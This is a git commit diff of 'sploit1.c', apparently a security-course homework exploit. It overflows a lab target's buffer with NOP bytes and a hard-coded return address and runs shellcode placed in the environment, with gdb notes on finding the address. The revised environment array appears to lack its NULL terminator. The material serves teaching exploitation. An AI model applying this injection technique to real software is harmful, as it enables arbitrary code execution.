cab8b0de1b369d344941d8c7f4c9f40512609746
justinhalford <justinhalford@gmail.com>
2024-05-10 15:15:58 -0400

    may 7

--- cs5435-hw4/sploits/sploit1.c
+++ cs5435-hw4/sploits/sploit1.c
@@ -5,30 +5,22 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/home/jh2422/h4/cs5435-hw4/targets/target1"
+#define TARGET "/tmp/target1"
 
-int main(void) {
-    char *args[3];
-    char *env[2];
+int main(void)
+{
+  char *args[3]; 
+  char *env[1];
 
-    char padding[4];
-    memset(padding, 'A', 4);
+  args[0] = TARGET;
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x19\xd7\xff\xff";
+  // (gdb) x/x *(char**)environ
+  // 0xbfffff9f:	0xdb31c031
+  args[2] = NULL;
+  
+  env[0] = shellcode;
+  execve(TARGET, args, env);
+  fprintf(stderr, "execve failed.\n");
 
-    char *malicious_buffer = (char *)malloc(4 + 4);
-    memcpy(malicious_buffer, padding, 4);
-    *(unsigned int *)(malicious_buffer + 4) = 0xffffd719;
-
-    char shellcode_env[sizeof(shellcode) + 8];
-    sprintf(shellcode_env, "SHELL=%s", shellcode);
-
-    args[0] = TARGET;
-    args[1] = malicious_buffer;
-    args[2] = NULL;
-
-    env[0] = shellcode_env;
-    env[1] = NULL;
-
-    execve(TARGET, args, env);
-    fprintf(stderr, "execve failed.\n");
-    return 0;
+  return 0;
 }
